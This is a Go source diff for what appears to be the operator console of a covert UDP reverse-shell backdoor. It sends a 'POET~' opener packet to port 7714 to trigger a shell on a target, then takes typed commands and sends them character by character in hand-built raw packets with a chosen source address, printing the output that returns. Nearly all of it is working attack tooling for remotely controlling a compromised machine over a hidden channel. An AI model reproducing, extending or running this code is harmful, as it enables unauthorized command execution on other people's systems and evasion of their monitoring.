@@ -1,6 +1,7 @@
 package main
 
 import (
+	"errors"
 	"flag"
 	"fmt"
 	"net"
@@ -17,35 +18,27 @@ const (
 	CONN_TYPE = "udp"
 )
 
-// Handles incoming requests.
-func handleRequest(conn net.PacketConn) {
-	var buf []byte
-
-	for {
-		// Make a buffer to hold incoming data.
-		buf = make([]byte, 1024)                               // TODO flush buffer each time
-		conn.SetReadDeadline(time.Now().Add(60 * time.Second)) // 30 second wait time
-		// Read the incoming connection into the buffer.
-		nRead, addr, err := conn.ReadFrom(buf)
-		if err != nil {
-			fmt.Println("Error reading:", err.Error())
-		}
-		fmt.Printf("%d", nRead)
-
-		var input string
-		fmt.Scanf("%s", &input) // get command input
-
-		if input == "exit" {
-			return
-		}
-
-		conn.WriteTo([]byte(input), addr)
+func GetInterfaceIpv4Addr(interfaceName string) (addr string, err error) {
+	var (
+		ief      *net.Interface
+		addrs    []net.Addr
+		ipv4Addr net.IP
+	)
+	if ief, err = net.InterfaceByName(interfaceName); err != nil { // get interface
+		return
 	}
-
-	// Send a response back to person contacting us.
-	//   conn.Write([]byte(command))
-	// Close the connection when you're done with it.
-	// conn.Close()
+	if addrs, err = ief.Addrs(); err != nil { // get addresses
+		return
+	}
+	for _, addr := range addrs { // get ipv4 address
+		if ipv4Addr = addr.(*net.IPNet).IP.To4(); ipv4Addr != nil {
+			break
+		}
+	}
+	if ipv4Addr == nil {
+		return "", errors.New(fmt.Sprintf("interface %s don't have an ipv4 address\n", interfaceName))
+	}
+	return ipv4Addr.String(), nil
 }
 
 func open(ifName string) (net.PacketConn, error) {
@@ -93,46 +86,62 @@ func buildUDPPacket(dst, src *net.UDPAddr, command string) ([]byte, error) {
 	return buffer.Bytes(), nil
 }
 
-func sendUDPPacket(iFace string, target string, command string) {
+func sendUDPPacket(iFace string, source string, target string, command string, sport int, dport int) {
 	conn, err := open(iFace)
 	if err != nil {
 		panic(err)
 	}
 	dst := &net.UDPAddr{
 		IP:   net.ParseIP(target),
-		Port: 7714,
+		Port: dport,
 	}
-	b, err := buildUDPPacket(dst, &net.UDPAddr{IP: net.ParseIP(target), Port: 77}, command)
+	if sport != 77 {
+		for _, c := range command {
+			udpHelper(conn, dst, source, sport, string(c)) // send char by char
+		}
+		udpHelper(conn, dst, source, sport, "\n") // send newline char
+	} else {
+		udpHelper(conn, dst, source, sport, command) // send revshell opener
+	}
+	return
+}
+
+func udpHelper(conn net.PacketConn, dst *net.UDPAddr, source string, sport int, data string) {
+	fmt.Printf("Data: %s\n", data)
+	b, err := buildUDPPacket(dst, &net.UDPAddr{IP: net.ParseIP(source), Port: sport}, data)
 	if err != nil {
 		panic(err)
 	}
-	_, err := conn.WriteTo(b, &net.IPAddr{IP: dst.IP})
+	_, err = conn.WriteTo(b, &net.IPAddr{IP: dst.IP})
 	if err != nil {
 		panic(err)
 	}
 }
 
+func readBuffer(pc net.PacketConn, addrChan chan net.Addr) {
+	buffer := make([]byte, 2048)
+	for {
+		numBytesRead, addr, err := pc.ReadFrom(buffer)
+		if err != nil {
+			panic(err)
+		}
+		fmt.Printf("ALL-BUFFER: %s\n", string(buffer)) // DEBUG
+		if numBytesRead > 1 {
+			fmt.Printf("MAIN-BUFFER: %s\n", string(buffer)) // print output
+			addrChan <- addr
+		} else {
+			fmt.Printf("DEL: %s\n", string(buffer))
+		}
+		buffer = buffer[:0] // zero out buffer each time
+
+	}
+}
+
 func main() {
-	/*
-		1. start binary w/ correct args
-		2. prompt for target to hit, send custom UDP packet with source IP
-		3. listening in background on 0.0.0.0:5858 for connection //TODO change port
-		4. print data from target (ex. prompt or output)
-		5. send commands with custom build udp packet
-		6. exit command to kill full process
-	*/
 	var iFace string
 	var source string
-
-	flag.StringVar(&source, "s", "127.0.0.1", "REQUIRED: source IP to listen on")
-	// flag.StringVar(&command, "c", "default", "REQUIRED: command to execute on source")
-
-	flag.Parse()
-
-	if source == "127.0.0.1" {
-		flag.Usage()
-		return
-	}
+	var command string
+	var target string
 
 	iFace, ok := os.LookupEnv("IFACE")
 	if !ok {
@@ -140,21 +149,60 @@ func main() {
 		return
 	}
 
-	// prompt here for target to attack
-	// send POET udp open shell packet w/ IP
-	var target string
-	fmt.Scanf("Target: %s", &target)
+	flag.StringVar(&target, "t", "127.0.0.1", "IP address to target")
+
+	flag.Parse()
+
+	if target == "127.0.0.1" {
+		flag.Usage()
+		return
+	}
+
+	source, err := GetInterfaceIpv4Addr(iFace)
+	if err != nil {
+		panic(err)
+		return
+	}
+
 	opener := "POET~" + target
-	sendUDPPacket(iFace, target, opener)
+	sendUDPPacket(iFace, source, target, opener, 77, 7714)
 
 	pc, err := net.ListenPacket("udp", source+":"+CONN_PORT)
 	if err != nil {
+		panic(err)
 		return
 	}
-	// `Close`ing the packet "connection" means cleaning the data structures
-	// allocated for holding information about the listening socket.
 	defer pc.Close()
 
-	// Handle connections in a new goroutine.
-	go handleRequest(pc)
+	addrChan := make(chan net.Addr)
+	var addr net.Addr
+
+	go readBuffer(pc, addrChan)
+	for {
+		select {
+		case <-addrChan:
+			fmt.Printf("in addrchan\n")
+			addr = <-addrChan
+			dport := addr.(*net.UDPAddr).Port
+
+			deadline := time.Now().Add(60 * time.Second)
+			err = pc.SetWriteDeadline(deadline)
+			if err != nil {
+				return
+			}
+
+			fmt.Print("Command: ")
+			fmt.Scanf("%s", &command)
+			if command == "exit" { 
+				return
+			}
+
+			sendUDPPacket(iFace, source, target, command, 5858, dport)
+
+			addrChan <- nil
+		default:
+			//do nothing
+		}
+	}
+	return
 }
